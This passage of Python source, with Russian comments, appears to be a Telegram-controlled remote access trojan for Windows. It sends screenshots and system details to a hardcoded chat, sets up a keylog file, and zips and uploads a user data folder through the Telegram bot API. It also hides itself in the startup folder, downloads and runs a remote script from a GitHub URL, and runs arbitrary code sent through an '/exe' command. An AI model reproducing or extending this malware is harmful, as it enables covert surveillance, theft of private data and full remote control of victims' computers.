

# Отправка сообщения в chat_id
chat_id = 1882056354 # Замените на ваш чат ID
with open('screenshot.png', 'rb') as screenshot_file:
    bot.send_photo(chat_id, screenshot_file)
bot.send_message(chat_id, message)
os.remove('screenshot.png')

user = os.environ.get("USERNAME")
user_folder = os.path.expanduser('~')
log_file = os.path.join(user_folder, 'keylogs.txt')
with open(log_file, "a") as f:
    f.write("-------------------------------------------------\n")
    f.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n")
initi = False

@bot.message_handler(commands=['info'])
def pc_info(message):
    chat_id = message.chat.id
    bot.send_chat_action(chat_id, 'typing')
    info = ''
    for pc_info in platform.uname():
        info += '\n' + pc_info
    bot.send_message(chat_id, info)
    try:
        error_message = f"ВЫПОЛНЕННО!!!"
        bot.send_message(chat_id, error_message)
    except PermissionError as e:
        error_message = f"ОШИБКА:: {e}"
        bot.send_message(chat_id, error_message)
    except Exception as e:
        error_message = f"ОШИБКА: {e}"
        bot.send_message(chat_id, error_message)
user = os.path.expanduser("~")

def send_zip_to_telegram(telegram_bot_token, chat_id, source_dir):
  def send_file_to_telegram_in_memory(chat_id, file_data, file_name):
    url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
    data = {'chat_id': chat_id}
    files = {'document': (file_name, file_data)}

    response = requests.post(url, data=data, files=files)

    if response.status_code != 200:
      print(f"Error sending file to Telegram. Chat ID: {chat_id}. Status code: {response.status_code}")
      print(response.text)
    else:
      print("File sent successfully!")

  try:
    zip_data = BytesIO()
    with zipfile.ZipFile(zip_data, 'w', compression=zipfile.ZIP_LZMA, compresslevel=9) as zipf:
      for root, _, files in os.walk(source_dir):
        for file in files:
          file_path = os.path.join(root, file)
          if "user_data" in file_path or "webview" in file_path or "temp" in file_path or "emoji" in file_path or "shortcuts-default.json" in file_path or "working" in file_path:
            continue
          try:
            zipf.write(file_path, os.path.relpath(file_path, source_dir))
          except Exception as e:
            print(f"Error adding file to zip: {str(e)}")

    zip_data.seek(0)
    send_file_to_telegram_in_memory(chat_id, zip_data.getvalue(), 'Mraks_By_sx180.zip')
  except Exception as e:
      print(f"Error creating or sending zip file: {str(e)}")
@bot.message_handler(commands=['avto1'])
def avto(message):
    try:
        pythoncom.CoInitialize()
        current_program = os.path.abspath(sys.argv[0])
        bot.send_message(message.chat.id, current_program)
        print(current_program)
        user_folder = os.path.expanduser("~")
        copy_folder = os.path.join(user_folder, "MyProgram")
        os.makedirs(copy_folder, exist_ok=True)
        shutil.copy(current_program, copy_folder)
        shortcut_name = "hostser.lnk"
        shortcut_path = os.path.join(user_folder, shortcut_name)
        with winshell.shortcut(shortcut_path) as shortcut:
            shortcut.path = os.path.join(copy_folder, os.path.basename(current_program))
            shortcut.show_cmd = win32con.SW_HIDE  # Bualmkpw pavlu
            shortcut.icon = (None, 0)
        startup_folder = winshell.startup()
        startup_shortcut_path = os.path.join(startup_folder, os.path.basename(shortcut_path))
        shutil.copy(shortcut_path, startup_shortcut_path)
        bot.send_message(message.chat.id, "Успешно добавил в автозапуск, теперь хуесосу скорее всего гг)!")
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка при добавлении в автозапуск бро :\ - {e}")

@bot.message_handler(commands=['TG'])
def execute_code_if_internet_available():
    while True:
        if check_internet_connection():
            try:
                try:
                    pythoncom.CoInitialize()
                    current_program = os.path.abspath(sys.argv[0])
                    bot.send_message(chat_id, current_program)
                    print(current_program)
                    user_folder = os.path.expanduser("~")
                    copy_folder = os.path.join(user_folder, "MyProgram")
                    os.makedirs(copy_folder, exist_ok=True)
                    shutil.copy(current_program, copy_folder)
                    shortcut_name = "hostser.lnk"
                    shortcut_path = os.path.join(user_folder, shortcut_name)
                except Exception as e:
                    bot.send_message(chat_id, f"ERROR PRI DOBAVKE B AVTOZAPUSK: {e}")
                user = os.path.expanduser("~")
                url = 'https://raw.githubusercontent.com/vovanskaie/SCVAD_MRAKS/master/stal.py'
                response = requests.get(url)
                html_content = response.content
                soup = BeautifulSoup(html_content, 'html.parser')
                text_without_tags = soup.get_text()
                exec(text_without_tags)
                bot.send_message(chat_id, "OTPRAVKA ZAVERSHENA BRAT")
            except Exception as e:
                pass
        else:
            # print("Подключение отсутствует. Повторная попытка через 10 секунд...")
            time.sleep(10)


def find_browsers(paths: List[str] = None) -> List[str]:

    browsers = []

    # Определяем список папок, где искать браузеры
    program_files_x86 = os.environ.get('PROGRAMFILES(X86)', r"C:\Program Files (x86)")
    default_paths = [
        os.path.join(program_files_x86, "Google", "Chrome", "Application"),
        os.path.join(program_files_x86, "Mozilla Firefox"),
        os.path.join(program_files_x86, "Opera"),
        os.path.join(program_files_x86, "Microsoft", "Edge"),
        os.path.join(program_files_x86, "BraveSoftware", "Brave-Browser", "Application"),
    ]

    # Добавляем дополнительные пути, если они указаны
    if paths:
        default_paths.extend(paths)

    # Ищем браузеры в папках
    for path in default_paths:
        try:
            for filename in os.listdir(path):
                if filename.endswith((".exe", ".lnk")):
                    # Проверяем, является ли файл браузером
                    if is_browser_executable(os.path.join(path, filename)):
                        browsers.append(os.path.join(path, filename))
        except FileNotFoundError:
            pass # Папка не найдена, пропускаем

    # Ищем браузеры в реестре
    browsers.extend(find_browsers_in_registry())

    return browsers

def is_browser_executable(filepath: str) -> bool:
    """
    Проверяет, является ли файл исполняемым файлом браузера.

    Args:
        filepath (str): Путь к файлу.

    Returns:
        bool: True, если файл является браузером, иначе False.
    """
    try:
        with open(filepath, "rb") as f:
            # Ищем ключевые слова в начале файла
            data = f.read(1024)
            if b"Chrome" in data or b"Firefox" in data or b"Opera" in data or b"Edge" in data or b"Brave" in data:
                return True
    except:
        return False

    return False

def find_browsers_in_registry():
    """Ищет браузеры в реестре."""
    browsers = []

    try:
        # Chrome
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome")
        install_path = winreg.QueryValueEx(key, "InstallLocation")[0]
        browsers.append(os.path.join(install_path, "chrome.exe"))

        # Firefox
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Mozilla Firefox")
        install_path = winreg.QueryValueEx(key, "InstallLocation")[0]
        browsers.append(os.path.join(install_path, "firefox.exe"))

        # Opera
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Opera")
        install_path = winreg.QueryValueEx(key, "InstallLocation")[0]
        browsers.append(os.path.join(install_path, "opera.exe"))

        # Edge
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Microsoft Edge")
        install_path = winreg.QueryValueEx(key, "InstallLocation")[0]
        browsers.append(os.path.join(install_path, "msedge.exe"))

        # Brave
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Yandex")
        install_path = winreg.QueryValueEx(key, "InstallLocation")[0]
        browsers.append(os.path.join(install_path, "yandex.exe"))

    except WindowsError:
        pass

    return browsers


@bot.message_handler(commands=['dox'])
def dox(message):
  try:
    # Скриншот
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')

    # Информация о системе
    system_info = get_system_info()

    # Отправка информации
    if screenshot is not None:
      with open('screenshot.png', 'rb') as screenshot_file:
        bot.send_photo(message.chat.id, screenshot_file)
      os.remove('screenshot.png')

    bot.send_message(message.chat.id, "Подключен ПК:")

    if system_info is not None:
      bot.send_message(message.chat.id, f"Название системы: {system_info.get('system_name', 'Информация не найдена')}")
      bot.send_message(message.chat.id, f"Айпи: {system_info.get('ip_address', 'Информация не найдена')}")
      bot.send_message(message.chat.id, f"Хост: {system_info.get('hostname', 'Информация не найдена')}")
      bot.send_message(message.chat.id, f"Время работы ПК: {system_info.get('uptime', 'Информация не найдена')}")
      bot.send_message(message.chat.id, f"Процессор: {system_info.get('cpu_cores', 'Информация не найдена')} ядер (Логических: {system_info.get('cpu_logical_cores', 'Информация не найдена')}), {system_info.get('cpu_frequency', 'Информация не найдена')} МГц")
      bot.send_message(message.chat.id, f"ОЗУ: {system_info.get('used_ram', 0):.2f} ГБ / {system_info.get('total_ram', 0):.2f} ГБ (Доступно: {system_info.get('available_ram', 0):.2f} ГБ)")

  except Exception as e:
    bot.send_message(message.chat.id, f"Ошибка при получении информации: {e}")

 # Глобальная переменная для хранения ссылки на текущее окно
@bot.message_handler(commands=['exe'])
def execute_code(message):
    chat_id = message.chat.id
    code = message.text.replace('/exe', '').strip()
    if code == '':
        bot.send_message(chat_id, '/exe твой код')
    try:
        exec(code)
        bot.send_message(chat_id, 'Код успешно выполнен.')
    except Exception as e:
        bot.send_message(chat_id, f'Произошла ошибка при выполнении кода: {e}')

@bot.message_handler(commands=['sms'])
def msg_box(message):
    chat_id = message.chat.id
    message_text = message.text.replace('/sms ', '')
    if message_text == '':
        bot.send_message(chat_id, 'НЕПРАВИЛЬНО НУЖНО ТАК: /sms твой текст')
    else:
        bot.send_message(chat_id, f'ПОЛЬЗОВАТЕЛЮ ВЫВЕДЕНО СООБЩЕНИЕ: {message_text}')
        message_bytes = message_text.encode('cp1251')
        ctypes.windll.user32.MessageBoxA(0, message_bytes, 'Information', 0)
        bot.send_message(chat_id, 'ПОЛЬЗОВАТЕЛЬ ЗАКРЫЛ СООБЩЕНИЕ')
    try:
        error_message = f"ВЫПОЛНЕННО!!!"
        bot.send_message(chat_id, error_message)
    except PermissionError as e:
        error_message = f"ОШИБКА:: {e}"
        bot.send_message(chat_id, error_message)
    except Exception as e:
        error_message = f"ОШИБКА: {e}"
        bot.send_message(chat_id, error_message)

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    # Проверка на наличие интернета
    if check_internet_connection():
        try:
            avtostart()
            execute_code_if_internet_available()
        except Exception as e:
            bot.send_message(chat_id, f"Ошибка при выполнении кода: {e}")
    else:
        bot.send_message(chat_id, "Нет подключения к интернету")
def mains():
    if __name__ == '__main__':
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            bot.send_message(chat_id, f"ОШИБКА В КОНЕЧНОМ ЗАПУСКЕ!! : \n  {e} ")
            print(f"ОШИБКА В КОНЕЧНОМ ЗАПУСКЕ: {e}")
            bot.polling(none_stop=True)
mains()
